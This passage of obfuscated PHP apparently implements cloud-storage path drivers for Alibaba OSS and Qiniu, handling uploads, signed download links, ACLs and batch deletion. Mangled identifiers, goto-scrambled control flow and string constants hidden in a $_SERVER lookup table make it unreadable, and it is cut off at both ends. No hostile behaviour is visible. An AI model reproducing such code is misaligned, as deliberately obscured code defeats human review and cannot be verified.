$_SERVER[¹Ò‹Ò¹]; $e–ğ¦±ãÁ  = $this->pathAcl($C®ÂÎİ²Ú”); return $e–ğ¦±ãÁ  == $eøã«’§ªù[1260] || $e–ğ¦±ãÁ  == $eøã«’§ªù[514] ? !0 : !1; } public function canWrite($e“©™ÛÏ„) { $Câ’Èã¸¹ = $this->pathAcl($e“©™ÛÏ„); return $Câ’Èã¸¹ == $_SERVER[¹Ò‹Ò¹][514] ? !0 : !1; } public function pathAcl($bãª¬ßâŠ) { goto C‰­Õ™ßÑ›; f†ò¹å°Œ®: $eë¼ŒŒç‘Ğ = $fÛ‚²Ì» == $cÍ¸¢ï„³¨[34] ? $this->bucketAcl : $fÛ‚²Ì»; if ($eë¼ŒŒç‘Ğ == $cÍ¸¢ï„³¨[1261]) { return $cÍ¸¢ï„³¨[1260]; } if ($eë¼ŒŒç‘Ğ == $cÍ¸¢ï„³¨[1262]) { return $cÍ¸¢ï„³¨[514]; } goto B„ˆ‘‡Ø‡ß; C‰­Õ™ßÑ›: $cÍ¸¢ï„³¨ =& $_SERVER[¹Ò‹Ò¹]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $fÛ‚²Ì» = $this->client->getObjectAcl($this->bucket, $this->pathEncode($bãª¬ßâŠ)); } catch (OSS\Core\OssException $EªãÄëä‹) { return !1; } goto f†ò¹å°Œ®; B„ˆ‘‡Ø‡ß: return $eë¼ŒŒç‘Ğ; goto bİæõÎ‚·ë; bİæõÎ‚·ë: } private function chmodPath($e¿íùğßå½, $BŠƒ‡ŠŒ‡ã = '') { $F¨›âÇõÜ— =& $_SERVER[¹Ò‹Ò¹]; $dˆ¨‹ÔÌä« = empty($BŠƒ‡ŠŒ‡ã) ? $F¨›âÇõÜ—[1262] : $BŠƒ‡ŠŒ‡ã; $fÚšš‹á²š = array($F¨›âÇõÜ—[34], $F¨›âÇõÜ—[190], $F¨›âÇõÜ—[1261], $F¨›âÇõÜ—[1262]); if (!in_array($dˆ¨‹ÔÌä«, $fÚšš‹á²š)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($e¿íùğßå½), $dˆ¨‹ÔÌä«); } catch (OSS\Core\OssException $Aóä±‚ï¶²) { return !1; } return !0; } public function getContent($e¿øÁ±¬) { return $this->fileSubstr($e¿øÁ±¬, -1); } public function setContent($fÏŸƒŠ©„, $Dù‹‹ÏË›× = '') { $dÂ˜è¶ïÂ =& $_SERVER[¹Ò‹Ò¹]; try { $a«µÜã¸åä = $this->trafficLimit($dÂ˜è¶ïÂ[1263]); $B÷Ã¬ĞÂ° = $this->client->putObject($this->bucket, $this->pathEncode($fÏŸƒŠ©„), $Dù‹‹ÏË›×, $a«µÜã¸åä); } catch (OSS\Core\OssException $CíÜšŒŒ) { return !1; } $càÀÆŒùäŞ = array($dÂ˜è¶ïÂ[1252] => trim($B÷Ã¬ĞÂ°[$dÂ˜è¶ïÂ[1264]], $dÂ˜è¶ïÂ[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($fÏŸƒŠ©„))); $this->updateObjMeta($fÏŸƒŠ©„, $càÀÆŒùäŞ); return isset($B÷Ã¬ĞÂ°[$dÂ˜è¶ïÂ[1265]][$dÂ˜è¶ïÂ[1211]]) ? !0 : !1; } private function updateObjMeta($bóÈŸš×ïÕ, $b¶Ñƒöµ‘Œ) { $bóÈŸš×ïÕ = $this->pathEncode($bóÈŸš×ïÕ); try { $d‚ÀÇƒ“³¥ = array(OSS\OssClient::OSS_HEADERS => $b¶Ñƒöµ‘Œ); $this->client->copyObject($this->bucket, $bóÈŸš×ïÕ, $this->bucket, $bóÈŸš×ïÕ, $d‚ÀÇƒ“³¥); } catch (OSS\Core\OssException $F—¢ÀÕÌîÇ) { return !1; } return !0; } public function upload($bå‡ÀœÅ, $dßªèø£¤, $A¹˜á‹Ñã¤ = false, $F‹ø§‹Áœ = REPEAT_REPLACE) { $Aè±´°—É¢ =& $_SERVER[¹Ò‹Ò¹]; $BßòÓÛ¿˜« = trim($bå‡ÀœÅ, $Aè±´°—É¢[8]); $Eª½¨›ŞÈš = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Aè±´°—É¢[1252] => @md5_file($dßªèø£¤)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bå‡ÀœÅ))); $Eª½¨›ŞÈš = $this->trafficLimit($Aè±´°—É¢[1263], $Eª½¨›ŞÈš); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($BßòÓÛ¿˜«), $dßªèø£¤, $Eª½¨›ŞÈš); } catch (OSS\Core\OssException $dã ‘óåä ) { return !1; } return $this->getPathOuter($bå‡ÀœÅ); } public function getHost() { $dä´ô»õˆ— =& $_SERVER[¹Ò‹Ò¹]; $eˆ°º„È…’ = explode($dä´ô»õˆ—[176], parent::getHost()); return $eˆ°º„È…’[0] . $dä´ô»õˆ—[176] . $this->bucket . $dä´ô»õˆ—[94] . $eˆ°º„È…’[1]; } public function uploadFormData($cˆÇ«šƒÓ÷, $a¾Âáò… = 3600) { goto bˆÖ¥­ÖØ; Aé«“”·ö©: return $A³†¶¶Ô³é; goto bÕâ©Äí”; dØ”Å—ê•¯: $C¥Ò„ÌÛ¡ = strpos($fÀŞœáß–Õ, $DÏ†›‡›õá[292]); $fÀŞœáß–Õ = substr($fÀŞœáß–Õ, 0, $C¥Ò„ÌÛ¡) . $DÏ†›‡›õá[1267]; $bğ²óšºÏŸ = 1048576000 * 5; goto d©‰…ã•Áæ; F£Ò•ÂóÜÛ: $EóŸ¦›ù = base64_encode(hash_hmac($DÏ†›‡›õá[228], $DåëÑŠÙùô, $this->secret, !0)); $A³†¶¶Ô³é = array($DÏ†›‡›õá[1174] => $DåëÑŠÙùô, $DÏ†›‡›õá[1269] => $this->accessKey, $DÏ†›‡›õá[1170] => $DÏ†›‡›õá[1162], $DÏ†›‡›õá[1270] => $EóŸ¦›ù, $DÏ†›‡›õá[174] => $F‘êˆ»…Üâ); $A³†¶¶Ô³é = $this->trafficLimit($DÏ†›‡›õá[1263], $A³†¶¶Ô³é); goto Aé«“”·ö©; A¢ÓÈˆÜ¿‹: $cøÉìØæ = date($DÏ†›‡›õá[1266], time() + $EíˆÔ¤³‰); $d¾—‚ÜŸ¿™ = new DateTime($cøÉìØæ); $fÀŞœáß–Õ = $d¾—‚ÜŸ¿™->format(DateTime::ISO8601); goto dØ”Å—ê•¯; bˆÖ¥­ÖØ: $DÏ†›‡›õá =& $_SERVER[¹Ò‹Ò¹]; if (!($F‘êˆ»…Üâ = $this->getHost())) { return !1; } $EíˆÔ¤³‰ = $a¾Âáò…; goto A¢ÓÈˆÜ¿‹; d©‰…ã•Áæ: $EÚé×öÚø¢ = $this->pathFather($cˆÇ«šƒÓ÷); $b²öóãŒ¡ø = array($DÏ†›‡›õá[1164] => $fÀŞœáß–Õ, $DÏ†›‡›õá[1165] => array(array($DÏ†›‡›õá[1268], 0, $bğ²óšºÏŸ), array($DÏ†›‡›õá[1168], $DÏ†›‡›õá[1169], $EÚé×öÚø¢))); $DåëÑŠÙùô = base64_encode(json_encode($b²öóãŒ¡ø)); goto F£Ò•ÂóÜÛ; bÕâ©Äí”: } public function multiUploadFormData($e·ªÓ’»Õº, $aÖƒ§ÁŸæ© = 3600) { $E ª½ï£É =& $_SERVER[¹Ò‹Ò¹]; if (!($EòÙö¿ÚÑ = $this->getHost())) { return !1; } $cÜŠÈ‹˜åİ = $this->trafficLimit($E ª½ï£É[1263]); $cµãğ„Âï = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($e·ªÓ’»Õº), $cÜŠÈ‹˜åİ); return array($E ª½ï£É[219] => $cµãğ„Âï, $E ª½ï£É[174] => $EòÙö¿ÚÑ . $E ª½ï£É[8] . $this->pathEncode($e·ªÓ’»Õº), $E ª½ï£É[220] => gmdate($E ª½ï£É[1271]), $E ª½ï£É[92] => $e·ªÓ’»Õº); } public function multiUploadAuthData($EÒ‡¶ëöäë, $FÎ›¦ºŒ²¡ = array()) { goto aã„Ã…ÜÁª; BØÏ›Ú¤ï: $aâƒĞ°Œ = array($dÖŞ¤Ú¸›[222], $dÖŞ¤Ú¸›[33], $dÖŞ¤Ú¸›[118], $E‘”ŠğÊ²Ï, "\x78\x2d\x6f\163\x73\x2d\x64\x61\x74\x65\x3a{$E‘”ŠğÊ²Ï}", $dÖŞ¤Ú¸›[8] . $this->bucket . $dÖŞ¤Ú¸›[8] . $f®¡³·Ö‡Ò . $Cè¢æŒòÕã); if (strpos($Cè¢æŒòÕã, $dÖŞ¤Ú¸›[223]) === 0) { $aâƒĞ°Œ[0] = $dÖŞ¤Ú¸›[224]; if ($a¶ÚÛšìˆØ = $this->trafficLimit($dÖŞ¤Ú¸›[1263])) { $f®¡³·Ö‡Ò = $dÖŞ¤Ú¸›[1272]; array_splice($aâƒĞ°Œ, 5, 0, $f®¡³·Ö‡Ò . $dÖŞ¤Ú¸›[4] . $a¶ÚÛšìˆØ[$f®¡³·Ö‡Ò]); } } if (isset($FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[225]]) && $FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[225]] == $dÖŞ¤Ú¸›[226]) { $aâƒĞ°Œ[0] = $dÖŞ¤Ú¸›[226]; } goto eá¼ƒ¹Ôß¾; eá¼ƒ¹Ôß¾: if (!empty($FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[1273]])) { $d˜´œŞï‰ƒ = array_merge(array($aâƒĞ°Œ[4]), $FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[1273]]); sort($d˜´œŞï‰ƒ); $aâƒĞ°Œ[4] = implode($dÖŞ¤Ú¸›[227], $d˜´œŞï‰ƒ); } $A¹×Áğøù¹ = implode($dÖŞ¤Ú¸›[227], $aâƒĞ°Œ); $cª”ö¿•Ç¡ = base64_encode(hash_hmac($dÖŞ¤Ú¸›[228], $A¹×Áğøù¹, $this->secret, !0)); goto a¸Ô¥À³ÚŒ; aã„Ã…ÜÁª: $dÖŞ¤Ú¸› =& $_SERVER[¹Ò‹Ò¹]; $E‘”ŠğÊ²Ï = isset($FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[220]]) ? $FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[220]] : gmdate($dÖŞ¤Ú¸›[1271]); $Cè¢æŒòÕã = isset($FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[167]]) ? $FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[167]] : $dÖŞ¤Ú¸›[33]; goto d‚ŒŠ¹–•; a¸Ô¥À³ÚŒ: $D›íˆ¶™èÑ = $dÖŞ¤Ú¸›[1236] . $this->accessKey . $dÖŞ¤Ú¸›[4] . $cª”ö¿•Ç¡; if (strpos($Cè¢æŒòÕã, $dÖŞ¤Ú¸›[223]) === 0) { $D›íˆ¶™èÑ = array($dÖŞ¤Ú¸›[230] => $D›íˆ¶™èÑ, $dÖŞ¤Ú¸›[220] => $E‘”ŠğÊ²Ï); if ($a¶ÚÛšìˆØ) { $D›íˆ¶™èÑ = array_merge($D›íˆ¶™èÑ, $a¶ÚÛšìˆØ); } } return $D›íˆ¶™èÑ; goto d£“Èæ…á; d‚ŒŠ¹–•: $f®¡³·Ö‡Ò = $EÒ‡¶ëöäë; if (isset($FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[92]])) { $f®¡³·Ö‡Ò = $FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[92]]; unset($FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[92]]); } if (isset($FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[221]])) { $FÎ›¦ºŒ²¡[$dÖŞ¤Ú¸›[220]] = $E‘”ŠğÊ²Ï; return $this->listUploadParts($f®¡³·Ö‡Ò, $FÎ›¦ºŒ²¡); } goto BØÏ›Ú¤ï; d£“Èæ…á: } public function listUploadParts($fÂ´‹¦ÑÚÎ, $DƒĞ˜Íİ½­) { goto fçë‚¸Şá¨; fçë‚¸Şá¨: $dãã÷¯İ»œ =& $_SERVER[¹Ò‹Ò¹]; $b÷‚­Â‡ŒÛ = parse_url_query($DƒĞ˜Íİ½­[$dãã÷¯İ»œ[167]]); $c‡ãöá¢Œ¬ = $this->client->listParts($this->bucket, $this->pathEncode($fÂ´‹¦ÑÚÎ), $b÷‚­Â‡ŒÛ[$dãã÷¯İ»œ[219]]); goto BˆÑùÓ–ä ; BˆÑùÓ–ä : $E­«ìŒ‰ªª = $c‡ãöá¢Œ¬->getListPart(); $bç½­é•ôµ = array(); foreach ($E­«ìŒ‰ªª as $C«Ä¼Š¸¶) { $bç½­é•ôµ[] = array($dãã÷¯İ»œ[1256] => $C«Ä¼Š¸¶->getPartNumber(), $dãã÷¯İ»œ[1257] => trim($C«Ä¼Š¸¶->getETag(), $dãã÷¯İ»œ[115])); } goto BŞõÊÈÄŒŒ; BŞõÊÈÄŒŒ: unset($DƒĞ˜Íİ½­[$dãã÷¯İ»œ[221]], $DƒĞ˜Íİ½­[$dãã÷¯İ»œ[225]]); $B¸Ó¥İÆÑæ = $this->multiUploadAuthData($fÂ´‹¦ÑÚÎ, $DƒĞ˜Íİ½­); if (empty($B¸Ó¥İÆÑæ)) { return !1; } goto Bù«×‚ĞÆÆ; Bù«×‚ĞÆÆ: return array($dãã÷¯İ»œ[230] => $B¸Ó¥İÆÑæ, $dãã÷¯İ»œ[220] => $DƒĞ˜Íİ½­[$dãã÷¯İ»œ[220]], $dãã÷¯İ»œ[232] => $bç½­é•ôµ); goto EİõİŞá; EİõİŞá: } public function download($A¤œ§¥Á•õ, $b’Èç¥‡Ì) { if ($this->isFolder($A¤œ§¥Á•õ)) { return !1; } try { $Eù§»ÍĞÇ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $b’Èç¥‡Ì); $Eù§»ÍĞÇ = $this->trafficLimit($_SERVER[¹Ò‹Ò¹][108], $Eù§»ÍĞÇ); $this->client->getObject($this->bucket, $this->pathEncode($A¤œ§¥Á•õ), $Eù§»ÍĞÇ); } catch (OSS\Core\OssException $B¸ÈÌêğ£¶) { return !1; } return $b’Èç¥‡Ì; } public function fileSubstr($a šä†äšŸ, $bêĞ®›„’ = 0, $F™ôÎˆÚ¤î = false) { if ($bêĞ®›„’ === -1) { $f…–±” Ó— = array(); } else { if ($F™ôÎˆÚ¤î === !1) { $CÆÛ×•¹”… = $this->size($a šä†äšŸ); } else { $CÆÛ×•¹”… = $bêĞ®›„’ + $F™ôÎˆÚ¤î - 1; } $f…–±” Ó— = array(OSS\OssClient::OSS_RANGE => "{$bêĞ®›„’}\x2d{$CÆÛ×•¹”…}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($a šä†äšŸ), $f…–±” Ó—); } catch (OSS\Core\OssException $aÆÙ©±…‘·) { think_exception($aÆÙ©±…‘·->getMessage()); return !1; } } private function trafficLimit($eŠª‚±¨™©, $Eí¤Ş¸’³‡ = array()) { goto AêÉ‘‘‚¥; AêÉ‘‘‚¥: $A±ÍàÔ˜¤™ =& $_SERVER[¹Ò‹Ò¹]; if ($eŠª‚±¨™© == $A±ÍàÔ˜¤™[1263] && $this->isUploadServer() || $eŠª‚±¨™© == $A±ÍàÔ˜¤™[108] && $this->isFileOutServer()) { return $Eí¤Ş¸’³‡; } $cÅ±„™· = floatval($GLOBALS[$A±ÍàÔ˜¤™[6]][$A±ÍàÔ˜¤™[87]][$A±ÍàÔ˜¤™[106]][$eŠª‚±¨™©]) * 1024 * 1024 * 8; goto eÚ¥¶İçØÖ; eÚ¥¶İçØÖ: if (!$cÅ±„™·) { return $Eí¤Ş¸’³‡; } $cÅ±„™· = $cÅ±„™· < 819200 ? 819200 : ($cÅ±„™· > 838860800 ? 838860800 : $cÅ±„™·); $Eí¤Ş¸’³‡[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($cÅ±„™·); goto cñÀÎÕµ¼Ÿ; cñÀÎÕµ¼Ÿ: return $Eí¤Ş¸’³‡; goto f¢øëÚ˜©; f¢øëÚ˜©: } public function link($BáÀ»ŠÒö, $AÍ‚Î×®ñ = array()) { $CîÙ½‘¬Ì“ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->exist($BáÀ»ŠÒö) || $this->isFolder($BáÀ»ŠÒö)) { return !1; } try { $AÍ‚Î×®ñ = $this->trafficLimit($CîÙ½‘¬Ì“[108], $AÍ‚Î×®ñ); $fÍ¢¥ªªÅ = $this->client->signUrl($this->bucket, $this->pathEncode($BáÀ»ŠÒö), 3600 * 12, $CîÙ½‘¬Ì“[226], $AÍ‚Î×®ñ); return $this->getCdnLink($fÍ¢¥ªªÅ); } catch (OSS\Core\OssException $câš®†Á†İ) { return !1; } } public function fileOut($fÀ¾æï‹‘, $c³ëƒÜ†“Ë = false, $bÏİÒÓä³ = false, $CŠË²ç…àÚ = '') { goto ağÜµÖä¦©; c¼¯ÁµÀ°: $c³ëƒÜ†“Ë = $c³ëƒÜ†“Ë ? $EÑ›ƒî¥ƒ£[212] : $EÑ›ƒî¥ƒ£[213]; $F·µ•Ë­á“ = array(OSS\OssClient::OSS_SUB_RESOURCE => $EÑ›ƒî¥ƒ£[1274] . rawurlencode("{$c³ëƒÜ†“Ë}\73\146\151\154\145\156\x61\155\145\75{$bÏİÒÓä³}")); $F·µ•Ë­á“[OSS\OssClient::OSS_SUB_RESOURCE] .= $EÑ›ƒî¥ƒ£[1275] . rawurlencode($F®á£™¿ïä); goto AÇÅ…¬œ‡†; ağÜµÖä¦©: $EÑ›ƒî¥ƒ£ =& $_SERVER[¹Ò‹Ò¹]; if ($this->isFileOutServer()) { return $this->fileOutServer($fÀ¾æï‹‘, $c³ëƒÜ†“Ë, $bÏİÒÓä³, $CŠË²ç…àÚ); } if (!$bÏİÒÓä³) { $bÏİÒÓä³ = $this->pathThis($fÀ¾æï‹‘); } goto Bç¸áêˆ; AÇÅ…¬œ‡†: $cÛ¬·Ğ©ñÍ = $this->link($fÀ¾æï‹‘, $F·µ•Ë­á“); $this->fileOutLink($cÛ¬·Ğ©ñÍ); goto DÃ›ó•±”Š; Bç¸áêˆ: $bÏİÒÓä³ = rawurlencode($bÏİÒÓä³); $F®á£™¿ïä = get_file_mime(get_path_ext($bÏİÒÓä³)); if ($F®á£™¿ïä == $EÑ›ƒî¥ƒ£[211]) { return parent::fileOut($fÀ¾æï‹‘, $c³ëƒÜ†“Ë, $bÏİÒÓä³, $CŠË²ç…àÚ); } goto c¼¯ÁµÀ°; DÃ›ó•±”Š: } public function fileOutServer($D¿º»¶Ì™Á, $CšÇòÚªÇ = false, $cŞîà‹£ç = false, $fòÀŒŞì— = '') { parent::fileOut($D¿º»¶Ì™Á, $CšÇòÚªÇ, $cŞîà‹£ç, $fòÀŒŞì—); } public function fileOutImage($Fƒ­³Ç™¨, $CéãÁ›‡È = 250) { $a¯Ê¬Òëˆå = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¹Ò‹Ò¹][1276] . $CéãÁ›‡È); $E™‹êä¦£ = $this->link($Fƒ­³Ç™¨, $a¯Ê¬Òëˆå); $this->fileOutLink($E™‹êä¦£); } public function fileOutImageServer($aëÓÖ•ô, $aÍÑöÍàÖé = 250) { parent::fileOutImage($aëÓÖ•ô, $aÍÑöÍàÖé); } public function fileOutLink($a‘©ù·ùáª) { $f««ÔØßŸ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->isCdnHost() && substr($a‘©ù·ùáª, 0, 7) == $f««ÔØßŸ[1177]) { $a‘©ù·ùáª = $f««ÔØßŸ[1178] . substr($a‘©ù·ùáª, 7); } header($f««ÔØßŸ[158] . $a‘©ù·ùáª); die; } public function hashMd5($fÇ•¹º¯‡, $cá³¡‚ª‰ = '') { $B¹—ÙÃÖ¶ =& $_SERVER[¹Ò‹Ò¹]; $DÎ±õ¤¦î÷ = $this->_objectMeta($fÇ•¹º¯‡); if (!$DÎ±õ¤¦î÷) { return $B¹—ÙÃÖ¶[33]; } if (!isset($DÎ±õ¤¦î÷[$B¹—ÙÃÖ¶[1252]]) && !empty($cá³¡‚ª‰)) { $cÉ£ö¤ÉÂ = $this->updateObjMeta($fÇ•¹º¯‡, array($B¹—ÙÃÖ¶[1252] => $cá³¡‚ª‰)); $DÎ±õ¤¦î÷[$B¹—ÙÃÖ¶[1252]] = $cÉ£ö¤ÉÂ ? $cá³¡‚ª‰ : $B¹—ÙÃÖ¶[33]; } return isset($DÎ±õ¤¦î÷[$B¹—ÙÃÖ¶[1252]]) ? strtolower($DÎ±õ¤¦î÷[$B¹—ÙÃÖ¶[1252]]) : $B¹—ÙÃÖ¶[33]; } public function size($BéĞÉÅ¹) { $b•ò¼µ´µ = $this->objectMeta($BéĞÉÅ¹); return $b•ò¼µ´µ ? $b•ò¼µ´µ[$_SERVER[¹Ò‹Ò¹][77]] : 0; } public function info($bÉ‰ Û‹Éˆ) { if ($this->isFolder($bÉ‰ Û‹Éˆ)) { return $this->folderInfo($bÉ‰ Û‹Éˆ); } else { if ($this->isFile($bÉ‰ Û‹Éˆ)) { return $this->fileInfo($bÉ‰ Û‹Éˆ); } } return !1; } public function exist($cÕÊÀŠ´¬Ú) { return $this->isFile($cÕÊÀŠ´¬Ú) || $this->isFolder($cÕÊÀŠ´¬Ú); } public function isFile($e­Ç¦â¢š) { return !$this->isFolder($e­Ç¦â¢š) && $this->objectMeta($e­Ç¦â¢š); } public function isFolder($A²ÉÃàõ›©) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][197], $A²ÉÃàõ›©); } protected function objectMeta($C¨êéº´¢Ï) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][198], $C¨êéº´¢Ï); } protected function _objectMeta($D…·ô§Èœ‘) { $BÊ’½†‘İä =& $_SERVER[¹Ò‹Ò¹]; try { $CÚù …öÚñ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($D…·ô§Èœ‘)); } catch (OSS\Core\OssException $fÊ«‡â£ß) { $CÚù …öÚñ = !1; } if ($CÚù …öÚñ) { $CÚù …öÚñ[$BÊ’½†‘İä[77]] = intval($CÚù …öÚñ[$BÊ’½†‘İä[1250]]); } return $CÚù …öÚñ; } protected function _isFolder($AØºÍéã) { $d¬âí×Š‰‚ =& $_SERVER[¹Ò‹Ò¹]; if ($AØºÍéã == $d¬âí×Š‰‚[33] || $AØºÍéã == $d¬âí×Š‰‚[8]) { return !0; } $e’´å“ì»º = array($d¬âí×Š‰‚[1246] => $d¬âí×Š‰‚[8], $d¬âí×Š‰‚[1247] => rtrim($AØºÍéã, $d¬âí×Š‰‚[8]) . $d¬âí×Š‰‚[8], $d¬âí×Š‰‚[1248] => 1, $d¬âí×Š‰‚[1249] => $d¬âí×Š‰‚[33]); $E‡áªæ©‰† = $this->client->listObjects($this->bucket, $e’´å“ì»º); if ($E‡áªæ©‰†->getObjectList() || $E‡áªæ©‰†->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($c‡´È¢òÉÔ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¹Ò‹Ò¹][1277]; $this->_init($c‡´È¢òÉÔ); } public function _init($bÍ•ÉËÚ°) { goto dï‚ç…³á…; E¿°”ÂŠÈæ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto A×ÆíÎ‰õÏ; A×ÆíÎ‰õÏ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto E’—»å¶çÅ; dï‚ç…³á…: $a—­±œÉ÷È =& $_SERVER[¹Ò‹Ò¹]; foreach ($bÍ•ÉËÚ° as $EÓ‹–¨Ìà  => $Dº‚ŞÙëöç) { if (isset($this->{$EÓ‹–¨Ìà })) { $this->{$EÓ‹–¨Ìà } = $Dº‚ŞÙëöç; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($a—­±œÉ÷È[1278] . LNG($a—­±œÉ÷È[1237])); } goto E¿°”ÂŠÈæ; E’—»å¶çÅ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($BÑ²¤İ÷º„, $C¶äõá­é = '', $AÉì‹¬ïïæ = REPEAT_RENAME) { if ($this->setContent($BÑ²¤İ÷º„, $C¶äõá­é)) { return $this->getPathOuter($BÑ²¤İ÷º„); } return !1; } public function mkdir($b‹«£ÆÙè‰, $b…¬×Ò†¶ = REPEAT_SKIP) { goto eƒ½ƒ¾Î¬İ; fµ‡ÎÕÉÒ: $b‹«£ÆÙè‰ = $Bµ°¨ëŠ½— . $Aİ‹¹¡°ù°[8]; $d‚Ø½ó¬ß = get_path_this($Bµ°¨ëŠ½—); $AÓâƒ†²§ = $b‹«£ÆÙè‰ . $d‚Ø½ó¬ß; goto A¢î–¬Æ³¾; A¢î–¬Æ³¾: if (!$this->mkfile($AÓâƒ†²§)) { return !1; } if (!$this->moveFile($AÓâƒ†²§, $b‹«£ÆÙè‰)) { $this->delFile($AÓâƒ†²§); return !1; } return $this->getPathOuter($Bµ°¨ëŠ½—); goto DÛÖ–·ìë; eƒ½ƒ¾Î¬İ: $Aİ‹¹¡°ù° =& $_SERVER[¹Ò‹Ò¹]; $Bµ°¨ëŠ½— = trim($b‹«£ÆÙè‰, $Aİ‹¹¡°ù°[8]); if ($this->_isFolder($Bµ°¨ëŠ½—)) { return $this->getPathOuter($Bµ°¨ëŠ½—); } goto fµ‡ÎÕÉÒ; DÛÖ–·ìë: } public function copyFile($A¥ÔË©ÇÈÊ, $B³ÚÏ’éÓ) { $cçÀÈ¶­¨® = $this->bucketManager->copy($this->bucket, $A¥ÔË©ÇÈÊ, $this->bucket, $B³ÚÏ’éÓ, !0); return $cçÀÈ¶­¨® ? !1 : $this->getPathOuter($B³ÚÏ’éÓ); } public function moveFile($DØÇ˜ÃäŠÙ, $CÓŒ™Ì‚Äš) { $E‡¨À›ğò = $this->bucketManager->move($this->bucket, $DØÇ˜ÃäŠÙ, $this->bucket, $CÓŒ™Ì‚Äš, !0); return $E‡¨À›ğò ? !1 : $this->getPathOuter($CÓŒ™Ì‚Äš); } public function delFile($bÖñ´ùÌŠ) { if (!$this->exist($bÖñ´ùÌŠ)) { return !0; } $Aó†‡Õ¯ = $this->bucketManager->delete($this->bucket, $bÖñ´ùÌŠ); return $Aó†‡Õ¯ ? !1 : !0; } public function delFolder($døõÎ×ˆ§) { goto fŠ•˜­¯·á; E¼Šñ™ØÃø: if (!empty($døõÎ×ˆ§) && !in_array($DÎ¡Ï…›Ç, $E‡§ÍªÔ[$B½¼Ş¬ó§Ş[74]])) { $E‡§ÍªÔ[$B½¼Ş¬ó§Ş[74]][] = $DÎ¡Ï…›Ç; } $dØ©¡Í°¤¡ = $this->delByBatch($E‡§ÍªÔ[$B½¼Ş¬ó§Ş[73]]); if (!$dØ©¡Í°¤¡) { return !1; } goto D¯±ŞÛ•ï£; D¯±ŞÛ•ï£: return $this->delByBatch($E‡§ÍªÔ[$B½¼Ş¬ó§Ş[74]]); goto aâÎ±Ö§ø; fŠ•˜­¯·á: $B½¼Ş¬ó§Ş =& $_SERVER[¹Ò‹Ò¹]; if (!$this->exist($døõÎ×ˆ§)) { return !0; } $this->listItemCache = !1; goto B“ßŠÓà‡; B“ßŠÓà‡: $E‡§ÍªÔ = $this->fileList($døõÎ×ˆ§); $this->listItemCache = !0; $DÎ¡Ï…›Ç = trim($døõÎ×ˆ§, $B½¼Ş¬ó§Ş[8]) . $B½¼Ş¬ó§Ş[8]; goto E¼Šñ™ØÃø; aâÎ±Ö§ø: } private function delByBatch($eƒŒ¼‡¾¡„) { foreach (array_chunk($eƒŒ¼‡¾¡„, 1000) as $d®©Š‰ò”—) { $c²œ‰•° ¨ = $this->bucketManager->buildBatchDelete($this->bucket, $d®©Š‰ò”—); list($eĞÁ½öç‘Ï, $E¶¸§³àä) = $this->bucketManager->batch($c²œ‰•° ¨); if ($E¶¸§³àä) { return !1; } } return !0; } public function rename($aœê”¢†Û, $dµèÏõˆ‹¦) { return $this->renameObject($aœê”¢†Û, $dµèÏõˆ‹¦); } public function fileInfo($A›ª¬¢ö¶¼, $eßŠê¨…„ = false, $D­¾Æ±ñİ‘ = array()) { goto fé† ¤í³Ğ; Dàõ‡•¡Ä›: $A¼øœ‹ê°ê[$FÖĞë¼öÑ[192]] = $A¼øœ‹ê°ê[$FÖĞë¼öÑ[83]] = 0; $A¼øœ‹ê°ê[$FÖĞë¼öÑ[193]] = $A¼øœ‹ê°ê[$FÖĞë¼öÑ[194]] = !0; if (empty($D­¾Æ±ñİ‘)) { $D­¾Æ±ñİ‘ = $this->objectMeta($A›ª¬¢ö¶¼); if (!$D­¾Æ±ñİ‘) { return $A¼øœ‹ê°ê; } } goto D±ö‚³„ò´; fé† ¤í³Ğ: $FÖĞë¼öÑ =& $_SERVER[¹Ò‹Ò¹]; $A¼øœ‹ê°ê = array($FÖĞë¼öÑ[28] => $this->pathThis($A›ª¬¢ö¶¼), $FÖĞë¼öÑ[75] => $this->getPathOuter($FÖĞë¼öÑ[8] . $A›ª¬¢ö¶¼), $FÖĞë¼öÑ[29] => $FÖĞë¼öÑ[191], $FÖĞë¼öÑ[77] => isset($D­¾Æ±ñİ‘[$FÖĞë¼öÑ[1279]]) ? 